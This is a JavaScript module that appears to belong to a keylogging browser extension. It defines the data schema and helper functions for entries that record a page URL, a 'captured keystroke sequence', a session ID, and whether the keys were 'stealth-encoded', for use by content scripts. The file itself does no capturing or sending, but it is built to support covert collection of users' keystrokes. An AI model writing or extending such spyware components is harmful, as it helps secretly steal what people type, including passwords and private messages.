
(function (root, factory) {
  // Universal Module Definition (UMD)
  // Works as ES module, CommonJS, and plain <script> tag.
  if (typeof module !== "undefined" && module.exports) {
    // CommonJS / Node (for testing)
    module.exports = factory();
  } else {
    // Browser global — content scripts rely on this
    root.Schema = factory();
  }
})(typeof self !== "undefined" ? self : this, function () {
  "use strict";

  // ---------------------------------------------------------------------------
  // Internal helpers
  // ---------------------------------------------------------------------------

  /**
   * Generate a pseudo-random UUID v4 string.
   * Not cryptographically secure — sufficient for session grouping.
   * @returns {string} e.g. "a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d"
   */
  function _uuid() {
    return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(
      /[xy]/g,
      function (c) {
        var r = (Math.random() * 16) | 0;
        var v = c === "x" ? r : (r & 0x3) | 0x8;
        return v.toString(16);
      }
    );
  }

  /**
   * Validate that a value looks like a well-formed entry.
   * @param {*} obj — the value to check
   * @returns {boolean}
   */
  function isValidEntry(obj) {
    return (
      obj !== null &&
      typeof obj === "object" &&
      typeof obj.url === "string" &&
      typeof obj.timestamp === "number" &&
      typeof obj.keys === "string" &&
      typeof obj.sessionId === "string" &&
      typeof obj.obfuscated === "boolean"
    );
  }

  // ---------------------------------------------------------------------------
  // Public API
  // ---------------------------------------------------------------------------

  /**
   * SCHEMA_FIELDS — descriptive metadata about each field.
   * Useful for documentation, UI rendering, and validation messages.
   */
  var SCHEMA_FIELDS = Object.freeze({
    url: { type: "string", description: "Page URL where keys were captured" },
    timestamp: {
      type: "number",
      description: "Unix epoch milliseconds of entry creation",
    },
    keys: {
      type: "string",
      description: "Captured keystroke sequence (may be obfuscated)",
    },
    sessionId: {
      type: "string",
      description: "UUID v4 session identifier",
    },
    obfuscated: {
      type: "boolean",
      description: "Whether the keys field has been stealth-encoded",
    },
  });

  /**
   * Create a schema-compliant log entry.
   *
   * @param {string} url        — the page URL
   * @param {string} keys       — captured keystroke string
   * @param {Object} [options]  — optional overrides
   * @param {string} [options.sessionId]  — supply your own session ID
   * @param {boolean} [options.obfuscated] — mark as already obfuscated
   * @returns {Object} a frozen, schema-compliant entry
   *
   * @example
   *   const entry = Schema.createEntry("https://example.com", "hello world");
   *   // → { url: "https://example.com", timestamp: 1711..., keys: "hello world",
   *   //     sessionId: "a1b2...", obfuscated: false }
   */
  function createEntry(url, keys, options) {
    var opts = options || {};
    var entry = {
      url: typeof url === "string" ? url : "",
      timestamp: Date.now(),
      keys: typeof keys === "string" ? keys : "",
      sessionId: opts.sessionId || _uuid(),
      obfuscated: opts.obfuscated === true,
    };
    return Object.freeze(entry);
  }

  /**
   * Serialise an entry to a JSON string for storage.
   * Validates the entry shape before serialising.
   *
   * @param {Object} entry — a schema-compliant entry
   * @returns {string} JSON string
   * @throws {TypeError} if entry is not valid
   *
   * @example
   *   const json = Schema.serializeEntry(entry);
   *   // → '{"url":"https://...","timestamp":1711...,"keys":"abc",...}'
   */
  function serializeEntry(entry) {
    if (!isValidEntry(entry)) {
      throw new TypeError(
        "serializeEntry: received an invalid entry. " +
          "Expected { url: string, timestamp: number, keys: string, " +
          "sessionId: string, obfuscated: boolean }. " +
          "Got: " +
          JSON.stringify(entry)
      );
    }
    return JSON.stringify({
      url: entry.url,
      timestamp: entry.timestamp,
      keys: entry.keys,
      sessionId: entry.sessionId,
      obfuscated: entry.obfuscated,
    });
  }

  /**
   * Deserialise a raw JSON string back into a validated entry object.
   *
   * @param {string} raw — JSON string previously produced by serializeEntry
   * @returns {Object} a frozen, schema-compliant entry
   * @throws {SyntaxError} if raw is not valid JSON
   * @throws {TypeError}   if parsed object doesn't match the schema
   *
   * @example
   *   const entry = Schema.deserializeEntry(json);
   *   console.log(entry.keys); // → "abc"
   */
  function deserializeEntry(raw) {
    var parsed;
    try {
      parsed = JSON.parse(raw);
    } catch (e) {
      throw new SyntaxError(
        "deserializeEntry: failed to parse JSON — " + e.message
      );
    }
    if (!isValidEntry(parsed)) {
      throw new TypeError(
        "deserializeEntry: parsed object does not match schema. " +
          "Got: " +
          JSON.stringify(parsed)
      );
    }
    return Object.freeze(parsed);
  }

  /**
   * Create an empty / default entry — useful for tests and mocks.
   * @returns {Object} a frozen entry with empty/default values
   */
  function emptyEntry() {
    return Object.freeze({
      url: "",
      timestamp: 0,
      keys: "",
      sessionId: "00000000-0000-4000-8000-000000000000",
      obfuscated: false,
    });
  }

  // ---------------------------------------------------------------------------
  // Export surface
  // ---------------------------------------------------------------------------
  return Object.freeze({
    SCHEMA_FIELDS: SCHEMA_FIELDS,
    createEntry: createEntry,
    serializeEntry: serializeEntry,
    deserializeEntry: deserializeEntry,
    isValidEntry: isValidEntry,
    emptyEntry: emptyEntry,
  });
});
